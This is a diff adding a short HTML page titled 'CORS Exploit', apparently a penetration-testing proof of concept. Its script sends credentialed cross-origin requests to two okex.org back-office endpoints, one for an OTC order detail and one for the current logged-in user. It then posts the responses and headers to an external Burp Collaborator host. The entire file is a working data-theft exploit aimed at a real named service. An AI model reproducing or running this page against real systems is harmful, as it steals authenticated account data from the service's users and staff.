@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Send the response to Burp Collaborator
+                fetch('https://h5naj9cx2w48t6fkfsjdrv5ktbz2nyim7.oastify.com', {
+                    method: 'POST',
+                    headers: xhr.getAllResponseHeaders(), // Send all headers with the request
+                    body: xhr.responseText
+                });
+            }
+        };
+        xhr.open('GET', 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297', true);
+        xhr.withCredentials = true; // Include cookies in the request if needed
+        xhr.send();
+        
+        // Additional request to the specified URL
+        var additionalXhr = new XMLHttpRequest();
+        additionalXhr.onreadystatechange = function() {
+            if (additionalXhr.readyState === 4) {
+                // Send the response to Burp Collaborator
+                fetch('https://h5naj9cx2w48t6fkfsjdrv5ktbz2nyim7.oastify.com', {
+                    method: 'POST',
+                    headers: additionalXhr.getAllResponseHeaders(), // Send all headers with the request
+                    body: additionalXhr.responseText
+                });
+            }
+        };
+        additionalXhr.open('GET', 'https://csboss.okex.org/v2/boss/member/user/get-current-login-user?tb0udsy3y6=1', true);
+        additionalXhr.withCredentials = true; // Include cookies in the request if needed
+        additionalXhr.send();
+    </script>
+</body>
+</html>
